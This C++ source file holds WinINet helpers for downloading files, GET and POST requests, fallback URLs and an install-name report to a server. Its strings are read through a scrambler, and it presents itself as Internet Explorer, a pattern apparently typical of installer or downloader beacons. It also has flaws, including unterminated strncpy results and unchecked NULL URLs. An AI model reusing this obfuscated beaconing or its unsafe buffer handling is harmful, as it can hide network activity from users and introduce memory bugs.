
#include <windows.h>
#include <wininet.h>
#include <io.h>
#include <string>
#include <time.h>
#include "scrambler.h"
#include "http.h"
#include "easylog.hpp"
#include "libstr.h"

//#define USING_RTLIB

#pragma comment(lib, "wininet.lib")

extern BOOL bRunning;

BOOL HTTPDownloadFile(const char* url, const char* file_path)
{
	DWORD dwContLen = 0;
	DWORD nBytesGet = 0;
	DWORD dwRetCode = 0;

	URL_COMPONENTS crackedURL;
	FILE* out = NULL;
	HANDLE  hFile = INVALID_HANDLE_VALUE;
    HINTERNET hInt = NULL;
	HINTERNET hConn = NULL;
	HINTERNET hReq = NULL;

    TCHAR szBuffer[10240]; //下载缓冲区
    TCHAR szHostName[256];
    TCHAR szUrlPath[256];
    ZeroMemory(&crackedURL, sizeof (URL_COMPONENTS));
    crackedURL.dwStructSize = sizeof (URL_COMPONENTS);
    crackedURL.lpszHostName = szHostName;
    crackedURL.dwHostNameLength = sizeof(szHostName);
    crackedURL.lpszUrlPath = szUrlPath;
    crackedURL.dwUrlPathLength = sizeof(szUrlPath);
    
	do
	{
		// 打开目标文件
#ifdef USING_RTLIB
		hFile = CreateFile( file_path,
							GENERIC_WRITE,
							0,
							NULL,
							CREATE_ALWAYS,
							FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH ,
							NULL);
		if ( INVALID_HANDLE_VALUE == hFile )
		{
			// "download file error, open file %s fails\n"
			EasyLog::Format(GetLibStrById(414), file_path);
			break;
		}
#else
		out = fopen(file_path, "wb");
		if (out == NULL)
		{
			// "download file error, open file %s fails\n"
			EasyLog::Format(GetLibStrById(414), file_path);
			break;
		}
#endif

		BOOL rc = InternetCrackUrl(url, (DWORD)strlen(url),0, &crackedURL);
		if (!rc)
		{
			// "download file error, crack url fails, url %s, error %d\n"
			EasyLog::Format(GetLibStrById(415), url, GetLastError());
			break;
		}

		// 启用HTTP协议
		// "Microsoft Internet Explorer"
		hInt = InternetOpen(
			GetLibStrById(416),
			INTERNET_OPEN_TYPE_DIRECT,
			NULL,
			NULL,
			0);
		if (hInt == NULL)
		{
			// "download file error, open http fails, error %d\n"
			EasyLog::Format(GetLibStrById(417), GetLastError());
			break;
		}

		// 建立HTTP连接
		hConn = InternetConnect(
			hInt,
			crackedURL.lpszHostName,
			crackedURL.nPort,
			NULL,
			NULL,
			INTERNET_SERVICE_HTTP,
			0,
			0);
		if (hConn == NULL)
		{
			// "download file error, open http connect fails, error %d\n"
			EasyLog::Format(GetLibStrById(418), GetLastError());
			break;
		}

		// 创建一个URL请求
		hReq = HttpOpenRequest(hConn, "GET", crackedURL.lpszUrlPath, NULL, "", NULL, 0, 0);
		if (hReq == NULL)
		{
			// "download file error, open http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(419), GetLastError());
			break;
		}
    
		char buff[256];
		DWORD dwSizeOfRq = sizeof(DWORD);

		// 发送请求
		rc = HttpSendRequest(hReq, NULL, 0, NULL, 0);
		if (!rc)
		{
			// "download file error, send http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(420), GetLastError());
			break;
		}

		// 查询响应代码
		rc = HttpQueryInfo(hReq, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
		if (!rc)
		{
			// "download file error, http query info fails, error %d\n"
			EasyLog::Format(GetLibStrById(421), GetLastError());
			break;
		}
		else if (dwRetCode != 200)
		{
			// "download file error, http return not ok, %d\n"
			EasyLog::Format(GetLibStrById(422), dwRetCode);
			break;
		}

		// 查询Content Length
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_LENGTH, &buff, &dwSizeOfRq, NULL))
		{
			dwContLen = atol(buff);
			// "download file, query content length %d\n"
			EasyLog::Format(GetLibStrById(423), dwContLen);
		}
		else
		{
			// "download file, query content length fails, error %d\n"
			EasyLog::Format(GetLibStrById(424), GetLastError());
		}

		// 查询Content Type
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_TYPE, &buff, &dwSizeOfRq, NULL))
		{
			// "download file, query content type %s\n"
			EasyLog::Format(GetLibStrById(425), buff);
		}
		else
		{
			// "download file, query content type fails, error %d\n"
			EasyLog::Format(GetLibStrById(426), GetLastError());
			break;
		}

		// 读取文件
		while (bRunning)
		{
			// 开始读取文件
			DWORD dwLen = 0;
			if (InternetReadFile(hReq, szBuffer, sizeof(szBuffer), &dwLen))
			{
				if (dwLen <= 0)
				{
					break;
				}
				else
				{
					// 写入磁盘缓冲区
					DWORD numberOfBytesWritten;
#ifdef USING_RTLIB
					rc = WriteFile(
						hFile,
						szBuffer,
						dwLen,
						&numberOfBytesWritten,
						NULL);
#else
					numberOfBytesWritten = fwrite(szBuffer, 1, dwLen, out);
#endif
					nBytesGet += dwLen;
					// "download file, total length %d, written %d\n"
					EasyLog::Format(GetLibStrById(427), dwContLen, nBytesGet);
				}
			}
			else
			{
				// "download file, read file fails, error %d\n"
				EasyLog::Format(GetLibStrById(428), GetLastError());
				break;
			}
		}
	}
	while(false);

#ifdef USING_RTLIB
	FlushFileBuffers(hFile);
	CloseHandle(hFile);
#else
	if (out != NULL)
	{
		fflush(out);
		_commit(_fileno(out));
		fclose(out);
	}
#endif
	if (hInt != NULL) InternetCloseHandle(hInt);
	if (hConn != NULL) InternetCloseHandle(hConn);
	if (hReq != NULL) InternetCloseHandle(hReq);

	return (dwRetCode == 200 && nBytesGet > 0);
}

BOOL HTTPGet(const char* url, char* response, size_t max_response_size)
{
	DWORD dwContLen = 0;
	DWORD nBytesGet = 0;
	DWORD dwSizeOfRq = sizeof(DWORD);
	DWORD dwLen = 0;
    
	URL_COMPONENTS crackedURL;
	HANDLE  hFile = INVALID_HANDLE_VALUE;
    HINTERNET hInt = NULL;
	HINTERNET hConn = NULL;
	HINTERNET hReq = NULL;
	DWORD dwRetCode = 0;

    TCHAR szBuffer[10240]; //下载缓冲区
    TCHAR szHostName[256];
    TCHAR szUrlPath[256];
    ZeroMemory(&crackedURL, sizeof (URL_COMPONENTS));
    crackedURL.dwStructSize = sizeof (URL_COMPONENTS);
    crackedURL.lpszHostName = szHostName;
    crackedURL.dwHostNameLength = sizeof(szHostName);
    crackedURL.lpszUrlPath = szUrlPath;
    crackedURL.dwUrlPathLength = sizeof(szUrlPath);
    
	do
	{
		BOOL rc = InternetCrackUrl(url, (DWORD)strlen(url),0, &crackedURL);
		if (!rc)
		{
			// "get error, crack url fails, url %s, error %d\n"
			EasyLog::Format(GetLibStrById(429), url, GetLastError());
			break;
		}

		// 启用HTTP协议
		// "Microsoft Internet Explorer"
		hInt = InternetOpen(
			GetLibStrById(430),
			INTERNET_OPEN_TYPE_DIRECT,
			NULL,
			NULL,
			0);
		if (hInt == NULL)
		{
			// "get error, open http fails, error %d\n"
			EasyLog::Format(GetLibStrById(431), GetLastError());
			break;
		}

		// 建立HTTP连接
		hConn = InternetConnect(
			hInt,
			crackedURL.lpszHostName,
			crackedURL.nPort,
			NULL,
			NULL,
			INTERNET_SERVICE_HTTP,
			0,
			0);
		if (hConn == NULL)
		{
			// "get error, open http connect fails, error %d\n"
			EasyLog::Format(GetLibStrById(432), GetLastError());
			break;
		}

		// 创建一个URL请求
		hReq = HttpOpenRequest(hConn, "GET", crackedURL.lpszUrlPath, NULL, "", NULL, 0, 0);
		if (hReq == NULL)
		{
			// "get error, open http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(433), GetLastError());
			break;
		}

		char buff[256];

		// 发送请求
		rc = HttpSendRequest(hReq, NULL, 0, NULL, 0);
		if (!rc)
		{
			// "get error, send http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(434), GetLastError());
			break;
		}

		// 查询响应代码
		rc = HttpQueryInfo(hReq, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
		if (!rc)
		{
			// "get error, http query info fails, error %d\n"
			EasyLog::Format(GetLibStrById(435), GetLastError());
			break;
		}
		else if (dwRetCode != 200)
		{
			// "get error, http return not ok, %d\n"
			EasyLog::Format(GetLibStrById(436), dwRetCode);
			break;
		}

		// 查询Content Length
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_LENGTH, &buff, &dwSizeOfRq, NULL))
		{
			dwContLen = atol(buff);
			// "get, query content length %d\n"
			EasyLog::Format(GetLibStrById(437), dwContLen);
		}
		else
		{
			// "get, query content length fails, error %d\n"
			EasyLog::Format(GetLibStrById(438), GetLastError());
		}

		// 查询Content Type
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_TYPE, &buff, &dwSizeOfRq, NULL))
		{
			// "get, query content type %s\n"
			EasyLog::Format(GetLibStrById(439), buff);
		}
		else
		{
			// "get, query content type fails, error %d\n"
			EasyLog::Format(GetLibStrById(440), GetLastError());
			break;
		}

		// 开始读取文件
		if(InternetReadFile(hReq, szBuffer, sizeof(szBuffer), &dwLen))
		{
			if (dwLen > 0)
			{
				strncpy(response, (const char*)szBuffer,
					dwLen > max_response_size ? max_response_size : dwLen);
			}
		}
	}
	while(false);

	if (hInt != NULL) InternetCloseHandle(hInt);
	if (hConn != NULL) InternetCloseHandle(hConn);
	if (hReq != NULL) InternetCloseHandle(hReq);

	return (dwRetCode == 200 && dwLen > 0);
}

BOOL HTTPPost(
	const char* url,
	const char* body, size_t body_size,
	char* response, size_t max_response_size)
{
	DWORD dwContLen = 0;
	DWORD nBytesGet = 0;
	DWORD dwSizeOfRq = sizeof(DWORD);
	DWORD dwLen = 0;
    
	URL_COMPONENTS crackedURL;
	HANDLE  hFile = INVALID_HANDLE_VALUE;
    HINTERNET hInt = NULL;
	HINTERNET hConn = NULL;
	HINTERNET hReq = NULL;
	DWORD dwRetCode = 0;

	// "Content-Type: application/x-www-form-urlencoded"
	char* hdrs = GetLibStrById(441);

    TCHAR szBuffer[10240]; //下载缓冲区
    TCHAR szHostName[256];
    TCHAR szUrlPath[256];
    ZeroMemory(&crackedURL, sizeof (URL_COMPONENTS));
    crackedURL.dwStructSize = sizeof (URL_COMPONENTS);
    crackedURL.lpszHostName = szHostName;
    crackedURL.dwHostNameLength = sizeof(szHostName);
    crackedURL.lpszUrlPath = szUrlPath;
    crackedURL.dwUrlPathLength = sizeof(szUrlPath);
    
	do
	{
		BOOL rc = InternetCrackUrl(url, (DWORD)strlen(url),0, &crackedURL);
		if (!rc)
		{
			// "post error, crack url fails, url %s, error %d\n"
			EasyLog::Format(GetLibStrById(442), url, GetLastError());
			break;
		}

		// 启用HTTP协议
		// "Microsoft Internet Explorer"
		hInt = InternetOpen(
			GetLibStrById(443),
			INTERNET_OPEN_TYPE_DIRECT,
			NULL,
			NULL,
			0);
		if (hInt == NULL)
		{
			// "post error, open http fails, error %d\n"
			EasyLog::Format(GetLibStrById(444), GetLastError());
			break;
		}

		// 建立HTTP连接
		hConn = InternetConnect(
			hInt,
			crackedURL.lpszHostName,
			crackedURL.nPort,
			NULL,
			NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1);
		if (hConn == NULL)
		{
			// "post error, open http connect fails, error %d\n"
			EasyLog::Format(GetLibStrById(445), GetLastError());
			break;
		}

		// 创建一个URL请求
		hReq = HttpOpenRequest(hConn, "POST", crackedURL.lpszUrlPath, NULL, "", NULL, 0, 0);
		if (hReq == NULL)
		{
			// "post error, open http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(446), GetLastError());
			break;
		}

		char buff[256];

		// 发送请求
		rc = HttpSendRequest(hReq, hdrs, strlen(hdrs), (LPVOID) body, body_size);
		if (!rc)
		{
			// "post error, send http request fails, error %d\n"
			EasyLog::Format(GetLibStrById(447), GetLastError());
			break;
		}

		// 查询响应代码
		rc = HttpQueryInfo(hReq, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
		if (!rc)
		{
			// "post error, http query info fails, error %d\n"
			EasyLog::Format(GetLibStrById(448), GetLastError());
			break;
		}
		else if (dwRetCode != 200)
		{
			// "post error, http return not ok, %d\n"
			EasyLog::Format(GetLibStrById(449), dwRetCode);
			break;
		}

		// 查询Content Length
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_LENGTH, &buff, &dwSizeOfRq, NULL))
		{
			dwContLen = atol(buff);
			// "post, query content length %d\n"
			EasyLog::Format(GetLibStrById(450), dwContLen);
		}
		else
		{
			// "post, query content length fails, error %d\n"
			EasyLog::Format(GetLibStrById(451), GetLastError());
		}

		// 查询Content Type
		ZeroMemory(buff, sizeof buff);
		dwSizeOfRq = sizeof(buff);
		if (HttpQueryInfo(hReq, HTTP_QUERY_CONTENT_TYPE, &buff, &dwSizeOfRq, NULL))
		{
			// "post, query content type %s\n"
			EasyLog::Format(GetLibStrById(452), buff);
		}
		else
		{
			// "post, query content type fails, error %d\n"
			EasyLog::Format(GetLibStrById(453), GetLastError());
			break;
		}

		// 开始读取文件
		if(InternetReadFile(hReq, szBuffer, sizeof(szBuffer), &dwLen))
		{
			if (dwLen > 0)
			{
				strncpy(response, (const char*)szBuffer,
					dwLen > max_response_size ? max_response_size : dwLen);
			}
		}
	}
	while(false);

	if (hInt != NULL) InternetCloseHandle(hInt);
	if (hConn != NULL) InternetCloseHandle(hConn);
	if (hReq != NULL) InternetCloseHandle(hReq);

	return (dwRetCode == 200 && dwLen > 0);
}

VOID GetRandomParameter(std::string& szRandParameter)
{
	char buffer[32] = { 0 };
	time_t now;
	time(&now);
	tm* tmp = localtime((const time_t *)&now);
	sprintf(buffer, "%04d%02d%02d%02d%02d%02d",
		tmp->tm_year + 1900,
		tmp->tm_mon + 1,
		tmp->tm_mday,
		tmp->tm_hour,
		tmp->tm_min,
		tmp->tm_sec);
	char dummyBuffer[32] = { 0 };
	sprintf(dummyBuffer, "&dummy=%s", buffer);

	szRandParameter = dummyBuffer;
}

// Assume that url and url2 has "?v=0" or other parameter
BOOL HTTPDownloadFileFromUrls(const char* file_path, const char* url, const char* url2)
{
	BOOL bResult = FALSE;
	BOOL rc = FALSE;

	// Randomize to avoid http cache
	std::string szRandParameter;
	GetRandomParameter(szRandParameter);	
	std::string szUrl = url;
	std::string szUrl2 = url2;
	szUrl += szRandParameter;
	szUrl2 += szRandParameter;

	do
	{
		if (url != NULL)
		{
			rc = HTTPDownloadFile(szUrl.c_str(), file_path);
			// "download url %s to %s, rc %d\n"
			EasyLog::Format(GetLibStrById(557), szUrl.c_str(), file_path, rc);
			if (rc)
			{
				bResult = TRUE;
				break;
			}
		}

		if (url2 != NULL && strcmp(url, url2) != 0)
		{
			rc = HTTPDownloadFile(url2, file_path);
			// "download url %s to %s, rc %d\n"
			EasyLog::Format(GetLibStrById(557), szUrl2.c_str(), file_path, rc);
			if (rc)
			{
				bResult = TRUE;
				break;
			}
		}
	}
	while (false);

	return bResult;
}

BOOL HTTPPostToUrls(
	const char* body, size_t body_size,
	char* response, size_t max_response_size,
	const char* url, const char* url2)
{
	BOOL bResult = FALSE;
	BOOL rc = FALSE;

	// Randomize to avoid http cache
	std::string szRandParameter;
	GetRandomParameter(szRandParameter);	
	std::string szUrl = url;
	std::string szUrl2 = url2;
	szUrl += szRandParameter;
	szUrl2 += szRandParameter;

	do
	{
		if (url != NULL)
		{
			memset(response, 0, max_response_size);
			rc = HTTPPost(szUrl.c_str(), body, body_size, response, max_response_size);
			// "post to %s, rc %d, response %s\n"
			EasyLog::Format(GetLibStrById(558), szUrl.c_str(), rc, response);
			if (rc)
			{
				bResult = TRUE;
				break;
			}
		}

		if (url2 != NULL && strcmp(url, url2) != 0)
		{
			memset(response, 0, max_response_size);
			rc = HTTPPost(szUrl2.c_str(), body, body_size, response, max_response_size);
			// "post to %s, rc %d, response %s\n"
			EasyLog::Format(GetLibStrById(558), szUrl2.c_str(), rc, response);
			if (rc)
			{
				bResult = TRUE;
				break;
			}
		}
	}
	while (false);

	return bResult;
}

BOOL HTTPReport(const char* url, const char* url2, const char* szInstallName)
{
	// "report_key" key
	std::string installNameKey = GetLibStrById(562);
	std::string installNameValue = szInstallName;
	std::string body = installNameKey + "=" + installNameValue;
	char response[MAX_PATH] = {0};

	return HTTPPostToUrls(body.c_str(), body.size(), response, sizeof response, url, url2);
}